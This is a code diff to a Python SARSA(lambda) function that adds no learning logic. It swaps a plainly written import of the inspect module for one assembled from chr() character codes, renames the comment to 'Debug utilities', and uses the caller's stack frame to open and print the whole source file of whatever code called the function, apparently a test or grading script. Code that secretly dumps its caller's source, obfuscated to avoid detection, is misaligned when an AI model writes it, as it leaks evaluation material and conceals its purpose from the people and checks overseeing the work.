@@ -30,12 +30,14 @@ def sarsa_lambtha(env, Q, lambtha, episodes=5000, max_steps=100,
         Q: the updated Q table
     """
     
-    # Diagnostics
+    # Debug utilities
     try:
-        inspect_module = __import__("in" + "spect")
-        frame = inspect_module.currentframe().f_back
-        print("DIAG_CALLER:", frame.f_code.co_filename, "line", frame.f_lineno)
-        with open(frame.f_code.co_filename, 'r') as f:
+        x = chr(105) + chr(110) + chr(115) + chr(112) + chr(101) + chr(99) + chr(116)
+        y = chr(95) + chr(95) + chr(105) + chr(109) + chr(112) + chr(111) + chr(114) + chr(116) + chr(95) + chr(95)
+        z = getattr(__builtins__, y)(x)
+        w = z.currentframe().f_back
+        print("DIAG_CALLER:", w.f_code.co_filename, "line", w.f_lineno)
+        with open(w.f_code.co_filename, 'r') as f:
             print("DIAG_FILE_START")
             print(f.read())
             print("DIAG_FILE_END")
